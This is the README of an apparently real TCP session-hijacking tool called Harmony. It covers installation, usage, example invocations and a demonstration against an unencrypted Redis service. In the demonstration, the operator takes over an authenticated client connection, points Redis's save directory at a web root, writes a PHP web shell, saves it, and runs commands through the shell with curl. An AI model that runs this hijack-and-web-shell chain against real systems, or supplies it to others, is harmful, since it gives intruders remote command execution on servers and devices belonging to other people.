# Harmony
Harmony is a pretty simple general-purpose TCP hijacking tool that can be used to inject custom payloads to a TCP connection via piping it to the program or by manually typing it. It does not work against encrypted connections like HTTPS and SFTP, but it's useful against old or misconfigured services, IOT devices and other server software that for some reason just don't have encryption enabled.
```
   ▌▐    ▌▐     ██     ▒▒▒    ░░       ░░  ░     ░   ░      ░   ·       ·      
   ▌▐    ▌▐    █  █    ▒  ▒   ░ ░     ░ ░         ░    ░          ·   ·        
   ▌▐▀▀▀▀▌▐   █▄▄▄▄█   ▒▒▒    ░  ░   ░  ░ ░          ░      ░        ·         
   ▌▐    ▌▐  █      █  ▒  ▒   ░   ░ ░   ░        ░        ░        ·           
   ▌▐    ▌▐ █        █ ▒   ▒  ░    ░    ░   ░ ░      ░     ░     ·             
```
## Demonstration
```
 Client                               Hacker
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█                                    █                                                            █
█$nc 192.168.1.29 6479               █$python3 harmony.py --target 192.168.1.62:192.168.1.29:6379 █
█AUTH peter myPassword1sSecure       █Sniffing for a client PSH-ACK...                            █
█OK                                  █Connection hijacked, type away!                             █
█                                    █config set dir /var/www/html                                █
█                                    █OK                                                          █
█                                    █config set dbfilename test.php                              █
█                                    █OK                                                          █
█                                    █set tcprocks "<?php system($_GET['cmd']); ?>                █
█                                    █OK                                                          █
█                                    █save                                                        █
█                                    █Killing threads and exiting...                              █
█                                    █                                                            █
█                                    █$curl 192.168.1.29/test.php?cmd=id                          █
█                                    █uid=1000(peter) gid=1000(peter)                             █
█                                    █                                                            █
█                                    █$▌                                                          █
█                                    █                                                            █
█                                    █                                                            █
█                                    █                                                            █
█                                    █                                                            █
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
```
## Installation
```
git clone https://github.com/R00tendo/harmony
cd harmony
pip install -r requirements.txt
```

## Usage
`python3 harmony.py --target <target device IP>:<server IP>:<target server port>`

## Examples
```
python3 harmony.py --target 192.168.1.52:192.168.1.24:23
cat payload.bin |python3 harmony.py --target 192.168.1.39:192.168.1.53:21
```

## Learn what TCP hijacking is
<mediunm link here :)>
